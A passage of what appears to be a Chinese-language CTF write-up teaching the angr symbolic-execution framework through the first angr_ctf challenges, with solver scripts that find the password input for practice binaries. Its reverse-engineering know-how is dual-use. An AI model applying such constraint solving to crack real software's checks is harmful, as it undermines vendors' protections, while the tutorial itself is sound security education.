基本食用指北</h2><p>首先把项目拉到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/jakespringer/angr_ctf.git</span><br></code></pre></td></tr></table></figure><p>之后进入到你想做的题目目录下使用脚本进行编译，比如说 <code>00_angr_find</code>，这里需要我们手动指定一个种子以及输出的文件名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> 00_angr_find/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py</span> <br>Usage: ./generate.py [seed] [output_file]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py 114514 00_angr_find</span><br></code></pre></td></tr></table></figure><h1 id="0x01-angr-ctf：基本用法"><a href="#0x01-angr-ctf：基本用法" class="headerlink" title="0x01. angr-ctf：基本用法"></a>0x01. angr-ctf：基本用法</h1><h2 id="00-angr-find：路径搜索"><a href="#00-angr-find：路径搜索" class="headerlink" title="00_angr_find：路径搜索"></a>00_angr_find：路径搜索</h2><p>惯例拖进 IDA，发现其会读入 8 字节后使用一个自定义函数处理，最后与密码 <code>&quot;XFQUUEQF&quot;</code> 对比：<br><img src="https://s2.loli.net/2022/10/31/vcWPp1GO7uHA8q6.png" alt="image.png"></p><p>按照传统的做逆向的方法是去逆 <code>complex_function()</code> ，逆出逻辑后写出解密脚本，但有了 angr 之后我们便可以使用<strong>符号执行</strong>（symbolic execution）来进行路径约束的自动求解</p><blockquote><p>符号执行简单理解便是将变量作为符号存储，通过分析路径约束获得由符号组成的表达式组，最后对其进行求解</p></blockquote><p>那么我们需要求解的路径约束便是执行到输出 <code>&quot;Good Job.&quot;</code> 的路径，这里笔者选择最后的输出点 <code>0x80492F0</code>：</p><p><img src="https://s2.loli.net/2022/10/31/hdaX8FY9ZVcvIRH.png" alt="image.png"></p><p>那么现在我们来看 angr 的基本用法</p><h3 id="angr-Project-顶层接口"><a href="#angr-Project-顶层接口" class="headerlink" title="angr.Project - 顶层接口"></a>angr.Project - 顶层接口</h3><p>我们若要使用 angr 来分析一个二进制文件，第一步则是创建一个 <code>angr.Project</code> 类——我们一切后续操作都将基于这个类实例进行展开，以下是一个🌰：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span> <span class="hljs-comment"># file to be analyzed</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(bin_path)<br>WARNING | <span class="hljs-number">2022</span>-<span class="hljs-number">11</span>-<span class="hljs-number">23</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">30</span>,006 | cle.loader | The main binary <span class="hljs-keyword">is</span> a position-independent executable. It <span class="hljs-keyword">is</span> being loaded <span class="hljs-keyword">with</span> a base address of <span class="hljs-number">0x400000</span>.<br></code></pre></td></tr></table></figure><p>首先，我们可以通过一个 project 获取对应二进制文件的基本信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch     <span class="hljs-comment"># architecture of the binary file</span><br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(proj.entry)    <span class="hljs-comment"># entry point of the binary file</span><br><span class="hljs-string">&#x27;0x401060&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename <span class="hljs-comment"># name of the binary file</span><br><span class="hljs-string">&#x27;./test&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p><code>arch</code> 是一个 <code>archiinfo.Arch</code> 类实例，其包含了运行该文件的 CPU 信息等各种数据</p><ul><li><p><code>arch.bits</code> &amp; <code>arch.bytes</code> ：CPU 的字长（单位为位&#x2F;字节）</p></li><li><p><code>arch.name</code>：架构名，例如  <em>X86</em>  </p></li><li><p><code>arch.memory_endness</code>：端序，大端为 <code>Endness.BE</code> ，小端为 <code>Endness.LE</code></p><blockquote><p>源码里还有一个 “中端序” <code>Endness.ME</code> ：）</p></blockquote></li></ul></li></ul><h4 id="①-factory-实用类工厂"><a href="#①-factory-实用类工厂" class="headerlink" title="① factory - 实用类工厂"></a>① factory - 实用类工厂</h4><p><code>project.factory</code> 为我们提供了一些实用的类的构造器</p><h5 id="I-block-基本块"><a href="#I-block-基本块" class="headerlink" title="I. block - 基本块"></a>I. block - 基本块</h5><p>angr 以基本块为单位分析代码，我们可以通过 <code>project.factory.block(address)</code> 获取给定地址所在的<strong>基本块</strong>——一个 <code>Block</code> 类实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry) <span class="hljs-comment"># extract the basic block</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.pp() <span class="hljs-comment"># pretty-print of disassemble code of the block</span><br>        _start:<br><span class="hljs-number">401060</span>  endbr64<br><span class="hljs-number">401064</span>  xor     ebp, ebp<br><span class="hljs-number">401066</span>  mov     r9, rdx<br><span class="hljs-number">401069</span>  pop     rsi<br><span class="hljs-number">40</span>106a  mov     rdx, rsp<br><span class="hljs-number">40</span>106d  <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0xfffffffffffffff0</span><br><span class="hljs-number">401071</span>  push    rax<br><span class="hljs-number">401072</span>  push    rsp<br><span class="hljs-number">401073</span>  lea     r8, [__libc_csu_fini]<br><span class="hljs-number">40</span>107a  lea     rcx, [__libc_csu_init]<br><span class="hljs-number">401081</span>  lea     rdi, [main]<br><span class="hljs-number">401088</span>  call    qword ptr [<span class="hljs-number">0x403fe0</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions <span class="hljs-comment"># instructions in the block</span><br><span class="hljs-number">12</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs <span class="hljs-comment"># addr of each instruction</span><br>(<span class="hljs-number">4198496</span>, <span class="hljs-number">4198500</span>, <span class="hljs-number">4198502</span>, <span class="hljs-number">4198505</span>, <span class="hljs-number">4198506</span>, <span class="hljs-number">4198509</span>, <span class="hljs-number">4198513</span>, <span class="hljs-number">4198514</span>, <span class="hljs-number">4198515</span>, <span class="hljs-number">4198522</span>, <span class="hljs-number">4198529</span>, <span class="hljs-number">4198536</span>)<br></code></pre></td></tr></table></figure><h5 id="II-state-模拟执行状态"><a href="#II-state-模拟执行状态" class="headerlink" title="II. state - 模拟执行状态"></a>II. state - 模拟执行状态</h5><p>angr 使用 <code>SimState</code> 类表示一个 <em>模拟的程序状态</em>  （simulated program state），我们的各种操作实际上是由一个 state 步进到另一个 state 的过程</p><p>我们使用 <code>project.factory.entry_state()</code> 获取一个程序的初始执行状态，使用 <code>project.factory.blank_state(addr)</code> 获取一个程序从指定地址开始执行的空白状态：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<br><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.blank_state(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure><ul><li><code>state.regs</code>：寄存器状态组，其中每个寄存器都为一个  <em>位向量</em>  （BitVector），我们可以通过寄存器名称来访问对应的寄存器（例如 <code>state.regs.esp -= 12</code> ）</li><li><code>state.mem</code>：该状态的内存访问接口，我们可以直接通过 <code>state.mem[addr].type</code> 完成内存访问（例如 <code>state.mem[0x1000].long = 4</code> ，对于读而言还需指定 <code>.resolved</code> 或 <code>.concrete</code> 表示位向量或是实际值，例如 <code>state.mem[0x1000].long.concrete</code>）</li><li><code>state.memory</code>：另一种形式的内存访问接口：<ul><li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量</li><li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址</li></ul></li><li><code>state.posix</code>：POSIX 相关的环境接口，例如 <code>state.posix.dumps(fileno)</code> 获取对应文件描述符上的流</li></ul><p>除了这些对模拟执行状态的信息获取接口外，还有一些解决方法的对应接口 <code>state.solver</code>，我们将在后续进行讲解</p><h5 id="III-simulation-manager-模拟执行器"><a href="#III-simulation-manager-模拟执行器" class="headerlink" title="III. simulation_manager - 模拟执行器"></a>III. simulation_manager - 模拟执行器</h5><p>angr 将一个状态的执行方法独立成一个 <code>SimulationManager</code> 类，以下两种写法等效：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simgr(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simulation_manager(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br></code></pre></td></tr></table></figure><ul><li><code>simgr.step()</code>：<strong>以基本块为单位</strong>的单步执行</li><li><code>simgr.explore(addr)</code>：路径探索，即<strong>执行到指定地址</strong>并进行约束求解，将执行完成的状态放在 <code>simgr.found</code> 列表中，若无法求解则该列表为空</li></ul><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么我们现在已经了解了 angr 的基本使用方法了，而本题我们只需要探索到对应路径即可，于是最后的求解脚本如下，详见注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./00_angr_find&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F0</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    simgr.explore(find = obj_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>一下就跑出来了，很快啊.mp4</p><p><img src="https://s2.loli.net/2022/10/31/BXmxhVOWjQdDwoE.png" alt="image.png"></p><h2 id="01-angr-avoid：路径避免"><a href="#01-angr-avoid：路径避免" class="headerlink" title="01_angr_avoid：路径避免"></a>01_angr_avoid：路径避免</h2><p>惯例拖入 IDA，发现太大了（流汗黄豆.jpg）</p><p><img src="https://s2.loli.net/2022/10/31/sKdFIweu56Sya9H.png" alt="image.png"></p><p>那这里我们手动分析一下，main 的逻辑还是惯例读入 8 字符作为 s1，而 s2 是一个固定值的字符串：</p><p><img src="https://s2.loli.net/2022/10/31/xJFCTN5OZVsjnkG.png" alt="image.png"></p><p>之后大概就是会对 s1、s2 进行一定处理并在各种代码块间跳转，有的路径上会调用到 <code>avoid_me()</code> ，最后都会调用到 <code>maybe_good()</code> ：</p><p><img src="https://s2.loli.net/2022/10/31/fRWJnZhMtyD5qo6.png" alt="image.png"></p><p>那么 <code>maybe_good()</code> 函数看样子应该是我们最终要求解的路径终点，只要满足两个条件：1）<code>should_succeed != 0</code> 2）<code>s1 == s2</code> 便说明我们成功了：</p><p><img src="https://s2.loli.net/2022/10/31/6d8uNkXWAoR1PM7.png" alt="image.png"></p><p>而 <code>avoid_me()</code>会将变量 <code>should_succeed</code> 置 0，这意味着我们在执行时应该避免调用了该函数的路径：</p><p><img src="https://s2.loli.net/2022/10/31/dQs5x4cuhTl2AzD.png" alt="image.png"></p><p>如果硬逆的话逻辑还是比较复杂的（<del>反正👴肯定不愿意手动逆</del>），于是我们还是可以使用 angr 进行求解，目标路径还是输出 <code>&quot;Good Job.&quot;</code>，不过这一题我们多了一个约束：避开 <code>avoid_me()</code> 函数的执行</p><p>如果我们不避开这个近乎无处不在的 <code>avoid_me()</code> 函数，则会造成<strong>路径爆炸</strong>（Path Explosion），从而大幅度增加求解时间，因此我们需要在路径约束的求解上避开该函数</p><h3 id="simgr-explore-的基本用法"><a href="#simgr-explore-的基本用法" class="headerlink" title="simgr.explore() 的基本用法"></a>simgr.explore() 的基本用法</h3><p>我们通常使用模拟器的 <code>.explore()</code> 方法来进行路径探索，传入的默认参数为 <code>find</code>——一个&#x2F;一组令模拟器终止运行的地址，符合的执行状态结果会被放到 <code>.found</code> 列表中</p><p>但除了 <code>find</code> 参数外，我们也可以指定 <code>avoid</code> 参数——模拟器运行中应当要<strong>避开</strong>的地址，当一个状态执行到这样的地址时，其会被放在 <code>.avoided</code> 列表中并不再往后执行</p><p>此外，我们还可以通过指定 <code>num_find</code> 参数来指定需要寻找的解状态的数量，若未指定则会在 <code>.found</code> 列表中存储所有的解状态</p><h3 id="FINAL-EXPLOUT"><a href="#FINAL-EXPLOUT" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>现在我们知道该如何进行路径避免了，于是最后的求解脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./01_angr_avoid&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F8</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    avoid_path_addr = <span class="hljs-number">0x80492BB</span> <span class="hljs-comment"># the path that we need to avoid</span><br>    simgr.explore(find = obj_path_addr, avoid = avoid_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是一下子就出来了：</p><p><img src="https://s2.loli.net/2022/10/31/wfTengqWBDoRisK.png" alt="image.png"></p><blockquote><p>笔者实际跑了一下不避开该约束的求解场景，巨<del>™</del>慢，<del>直接把👴の阿里☁学生🐓给炸了</del></p></blockquote><h2 id="02-angr-find-condition：自定义搜索条件"><a href="#02-angr-find-condition：自定义搜索条件" class="headerlink" title="02_angr_find_condition：自定义搜索条件"></a>02_angr_find_condition：自定义搜索条件</h2><p>惯例地拖入 IDA，<strong>似乎</strong>逻辑和第一道题差不多，<code>complex_function()</code> 也没啥改变这里就不贴了：</p><p><img src="https://s2.loli.net/2022/10/31/uFaZBR6c31KHbx5.png" alt="image.png"></p><p>但一看汇编就流汗黄豆了，<strong>因为实际上存在非常多的伪路径</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/McqmdiDI2jXLE1f.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/vhqK89csVgQ3dZz.png" alt="image.png"></p><p><strong>并且有着非常多的输出 Good Job 字符串的基本块</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/fq8Gy3AHdLEXJ51.png" alt="image.png"></p><p>如果你只是简单看了一下然后随便选了一个（比如说看到第一个直接选）扔进 angr 里求解，<strong>那就寄了</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/ZxejJwIW8TRGlD9.png" alt="image.png"></p><p>怎么办呢？第一种方法是手动再分析一下这些伪路径，但是这就不符合我们使用 angr 的自动求解思想了：）因此我们需要寻找一种能够避开这些路径的方法</p><h3 id="simgr-explore-的扩展用法"><a href="#simgr-explore-的扩展用法" class="headerlink" title="simgr.explore() 的扩展用法"></a>simgr.explore() 的扩展用法</h3><p>实际上 <code>explore()</code> 的参数 <code>find</code> 与 <code>avoid</code> 除了可以是目标地址外，<strong>还可以是自定义函数，参数为模拟状态，返回值为判定条件的布尔值</strong></p><ul><li>即我们可以编写自定义函数来判断一个状态是否是我们应当要寻找的状态</li></ul><p>例如，若是我们想要寻找一条输出指定字符串的路径，可以选择通过判断该字符串是否在输出中的方式，我们可以通过 <code>state.posix.dumps(文件描述符)</code> 来获取对应文件描述符上的字符流：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1 for stdout</span><br><span class="hljs-comment"># ...</span><br>simgr.explore(find = foo)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOUT-1"><a href="#FINAL-EXPLOUT-1" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>那么解题思路就清晰了，我们将求解的目标路径设为输出 <code>&quot;Good Job.&quot;</code> 字符串、avoid 路径设为输出 <code>&quot;Try again.&quot;</code> 字符串即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    bin_path = <span class="hljs-string">&#x27;./02_angr_find_condition&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/9nVmrKZvkezSdRQ.png" alt="image.png"></p><h1 id="0x02-angr-ctf：符号化"><a href="#0x02-angr-ctf：符号化" class="headerlink" title="0x02. angr-ctf：符号化"></a>0x02. angr-ctf：符号化</h1><h2 id="03-angr-symbolic-registers：符号化寄存器"><a href="#03-angr-symbolic-registers：符号化寄存器" class="headerlink" title="03_angr_symbolic_registers：符号化寄存器"></a>03_angr_symbolic_registers：符号化寄存器</h2><p>惯例拖进 IDA，大概是读入输入后用三个函数简单算一下，输入参数是 <code>eax、ebx、edx</code> 寄存器的值，三个结果都为 0 就🆗了：</p><p><img src="https://s2.loli.net/2022/10/31/Yze2DrmB6a1owTQ.png" alt="image.png"></p><p>在 <code>get_user_input()</code> 里会分别读三个数到 <code>eax、ebx、edx</code> 寄存器中：</p><p><img src="https://s2.loli.net/2022/10/31/2n6murUotEjVgCi.png" alt="image.png"></p><blockquote><p>然后你会发现反编译的结果就是个🐓⑧…👴刚看反编译的伪代码还想了半天为啥要多读两个数然后扔掉</p><p><img src="https://s2.loli.net/2022/10/31/DoxlVIvprB4KATb.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/8poqhHj2W1gi6lk.png" alt="image.png"></p></blockquote><p>然后你会发现用上一题的脚本也能秒解…不过这样就不是这道题出题的目的了：）</p><p>重新读一下题目——<code>symbolic registers</code>，这意味着<strong>本题我们应当将这三个寄存器设置为符号变量来进行约束求解</strong></p><h3 id="Claripy-angr-的求解引擎"><a href="#Claripy-angr-的求解引擎" class="headerlink" title="Claripy - angr 的求解引擎"></a>Claripy - angr 的求解引擎</h3><p><code>Claripy</code> 是 angr 的<strong>求解引擎</strong>（solver engine），其内部会无缝混合使用几种后端（concrete bitvectors、SAT solvers 等），对于我们而言一般不需要直接与其进行交互，但通常我们会使用其提供的一些接口</p><h4 id="bitvector-位向量"><a href="#bitvector-位向量" class="headerlink" title="bitvector - 位向量"></a>bitvector - 位向量</h4><p><strong>位向量</strong>（bitvector）是 angr 求解引擎中的一个重要部分，其表示了 <strong>一组位</strong> （a sequence of bits）</p><p>我们可以通过 <code>claripy.BVV(int_value, size_in_bits)</code> 或 <code>claripy.BVV(string_value)</code> 创建带有具体值（concrete value）的指定长度的位向量值（bitvector value）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv<br>&lt;BV64 <span class="hljs-number">0x617274746e626133</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2<br>&lt;BV32 <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>相同长度的位向量可以进行运算，对于不同长度的位向量则可以通过 <code>.zero_extend(extended_bits)</code> 完成位扩展（0填充）后进行运算，需要注意的是位向量的运算同样存在溢出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = bvv2.zero_extend(<span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv + bvv2<br>&lt;BV64 <span class="hljs-number">0x617274754d102022</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv * bvv<br>&lt;BV64 <span class="hljs-number">0x9842ff8e63f3b029</span>&gt;<br></code></pre></td></tr></table></figure><p>位向量除了代表具体值（concrete value）的 <code>bitvector value</code> 以外，还有代表<strong>符号变量</strong>（symbolic variable）的 <code>bitvector symbol</code>，我们可以通过 <code>claripy.BVS(name, size_in_bits)</code> 创建带名字的指定长度的位向量符号（bitvector symbol）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs<br>&lt;BV64 x_0_64&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2<br>&lt;BV64 y_1_64&gt;<br></code></pre></td></tr></table></figure><p>位向量符号与位向量值之间同意可以进行运算，组合成更加复杂的表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3 = (bvs * bvs2 + bvv) / bvs<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3<br>&lt;BV64 (x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>) / x_0_64&gt;<br></code></pre></td></tr></table></figure><p>我们可以通过 <code>.op</code> 与 <code>.args</code> 获得位向量的运算类型与参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.op<br><span class="hljs-string">&#x27;BVV&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs.op<br><span class="hljs-string">&#x27;BVS&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.op<br><span class="hljs-string">&#x27;__floordiv__&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.args<br>(&lt;BV64 x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>&gt;, &lt;BV64 x_0_64&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.args<br>(<span class="hljs-number">7021802812440994099</span>, <span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><h3 id="state-solver-状态的求解接口"><a href="#state-solver-状态的求解接口" class="headerlink" title="state.solver - 状态的求解接口"></a>state.solver - 状态的求解接口</h3><p>前面讲到 <code>state.solver</code> 提供了一些基于状态的求解接口，例如 solver 同样有创建位向量的 <code>.BVV()</code> 与 <code>.BVS()</code> 接口</p><p>在需要对位向量符号进行具体值的求解时，我们可以先将位向量符号存放到状态的内存&#x2F;寄存器中，之后用 simgr 探索到对应的状态后，再使用 <code>state.solver.eval()</code> 